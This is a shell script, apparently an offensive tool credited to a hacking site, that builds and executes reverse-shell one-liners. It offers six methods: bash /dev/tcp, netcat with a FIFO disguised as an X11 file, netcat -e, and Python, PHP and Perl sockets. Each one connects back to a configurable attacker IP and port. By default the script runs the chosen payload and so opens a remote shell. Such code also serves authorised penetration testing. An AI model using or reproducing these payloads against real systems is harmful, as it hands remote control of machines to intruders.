#/bin/sh
:<<DESC
 Reverse Shell command builder/executor
 t57root @ www.hackshell.net
 Mostly based on http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 Usage: /path/to/script/reverse_shell.sh METHOD [print] 2>&1
 Eg:
    Execute the back connect:
    /path/to/script/reverse_shell.sh bash_net_prog 2>&1
    Print the commnad only:
    /path/to/script/reverse_shell.sh bash_net_prog print
DESC

SHELL=/bin/sh
BACK_IP=127.0.0.1
BACK_PORT=8080

#Optional:
BIN_NETCAT=`which netcat`
BIN_PYTHON=`which python`
BIN_PHP=`which php`
BIN_PERL=`which perl`

#Banner
function banner(){
    cat <<EOF
  ____                                ____  _          _ _ 
 |  _ \ _____   _____ _ __ ___  ___  / ___|| |__   ___| | |
 | |_) / _ \ \ / / _ \ '__/ __|/ _ \ \___ \| '_ \ / _ \ | |
 |  _ <  __/\ V /  __/ |  \__ \  __/  ___) | | | |  __/ | |
 |_| \_\___| \_/ \___|_|  |___/\___| |____/|_| |_|\___|_|_|

EOF
    echo "Author: t57root @ www.hackshell.net"
    echo -e "Valid method: ${methods[*]}\n"
    [ -z "$1" ] || exit $1
}

#Bash Network Programming (bash-support needed)
function bash_net_prog(){
    #$SHELL < /dev/tcp/$BACK_IP/$BACK_PORT >&0 2>&0
    cat <<EOF
    $SHELL >& /dev/tcp/$BACK_IP/$BACK_PORT 0>&1
EOF
}

#Netcat with FIFO
function nc_with_fifo(){
    cat <<EOF
    [ -x /tmp/.X11_map ] || rm -f /tmp/.X11_map
    mknod /tmp/.X11_map p && $SHELL 0</tmp/.X11_map 2>&1 | $BIN_NETCAT $BACK_IP $BACK_PORT >/tmp/.X11_map
EOF
}

#Netcat with option -e
function nc_with_e(){
    cat <<EOF
$BIN_NETCAT $BACK_IP $BACK_PORT -e $SHELL
EOF
}

#Python socket
function python_socket(){
    cat <<EOF
$BIN_PYTHON -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$BACK_IP'",'$BACK_PORT'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["'$SHELL'"]);'
EOF
}

#Php socket
function php_socket(){
    cat <<EOF
$BIN_PHP -r '\$sock=fsockopen("$BACK_IP",$BACK_PORT);exec("$SHELL <&3 >&3 2>&3");'
EOF
}

#Perl socket
function perl_socket(){
    cat <<EOF
echo 'use Socket;\$i="$BACK_IP";\$p=$BACK_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("$SHELL");};' | $BIN_PERL
EOF
}

methods=(
bash_net_prog
nc_with_fifo
nc_with_e
python_socket
php_socket
perl_socket
)

banner
#Do parameter validation
[ $# -eq 1 ] || [ $# -eq 2 ] || exit 1
echo ${methods[*]} |grep -wq $1 || exit 1

$1
[ ! $2 ] || exit
echo -e "\n==================\n"
$1 |$SHELL
